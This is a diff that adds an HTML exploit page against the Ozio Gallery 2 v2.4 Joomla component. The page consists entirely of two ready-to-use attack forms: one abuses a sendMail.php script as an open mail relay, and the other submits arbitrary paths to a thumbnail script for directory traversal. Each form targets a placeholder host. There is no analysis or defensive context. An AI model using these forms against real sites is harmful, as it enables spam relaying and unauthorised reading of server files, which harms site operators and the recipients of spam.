@@ -1,0 +1,27 @@
+ 
+<h2>Ozio Gallery 2</h2>
+<h3>v 2.4</h3>
+ 
+<h4>Open Mail Relay:</h4>
+ 
+<form method="post"
+action="http://[target]/components/com_oziogallery2/imagin/scripts_ralcr/others/sendMail.php">
+<label for="to">To:</label><input id="to" name="to" type="text" /><br />
+<label for="from">From:</label><input id="from" name="from" type="text"
+/><br />
+<label for="subject">Subject:</label><input id="subject" name="subject"
+type="text" /><br />
+<label for="message">Message:</label><textarea id="message"
+name="message"></textarea><br />
+<input type="submit" value="Send"/>
+</form>
+ 
+ 
+<h4>Directory Traversal:</h4>
+ 
+<form method="post"
+action="http://[target]/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/readAndCreateThumbs.php">
+<label for="path">path:</label><input id="path" name="path" type="text"
+/><br />
+<input type="submit" value="Send"/>
+</form>
